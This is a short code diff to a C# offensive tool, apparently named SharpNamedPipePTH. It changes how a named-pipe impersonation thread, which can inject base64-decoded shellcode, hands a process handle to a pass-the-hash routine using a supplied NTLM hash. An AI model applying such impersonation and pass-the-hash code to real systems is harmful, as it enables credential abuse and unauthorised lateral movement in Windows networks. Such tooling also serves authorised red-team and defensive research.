@@ -118,17 +118,17 @@ namespace SharpNamedPipePTH
 
             // Start Pipe Server
             Console.WriteLine("Starting Pipe Server Thread!");
-            
+            IntPtr processHandle = IntPtr.Zero;
             if (shellcodegiven)
             {
                 byte[] shellcodebytes = Convert.FromBase64String(shellcode);
-                Thread t = new Thread(() => SharpNamedPipePTH.PipeServerImpersonate.ImpersonateClient(pipename, binary, shellcodebytes, Args));
+                Thread t = new Thread(() => processHandle = SharpNamedPipePTH.PipeServerImpersonate.ImpersonateClient(pipename, binary, shellcodebytes, Args, username, domain));
                 t.Start();
             }
             else
             {
                 byte[] shellcodebytes = null;
-                Thread t = new Thread(() => SharpNamedPipePTH.PipeServerImpersonate.ImpersonateClient(pipename, binary, shellcodebytes, Args));
+                Thread t = new Thread(() => processHandle = SharpNamedPipePTH.PipeServerImpersonate.ImpersonateClient(pipename, binary, shellcodebytes, Args, username, domain));
                 t.Start();
             }
             // Connect to the Named Pipe via NamedPipePTH
@@ -139,19 +139,19 @@ namespace SharpNamedPipePTH
             Console.WriteLine($"Waiting...");
             Thread.Sleep(5000);
 
-            if (Globals.suspendedProcessHandle == IntPtr.Zero)
+            /*if (Globals.suspendedProcessHandle == IntPtr.Zero)
             {
                 Console.WriteLine("Failed to get suspended process handle!");
-                return;
+                //return;
             }
             else
             {
                 Console.WriteLine($"Process Handle: '{Globals.suspendedProcessHandle}'");
-            }
+            }*/
 
 
 
-            PTH.PassTheHash(username, domain, hash, false);
+            PTH.PassTheHash(username, domain, processHandle, hash, false);
 
 
         }
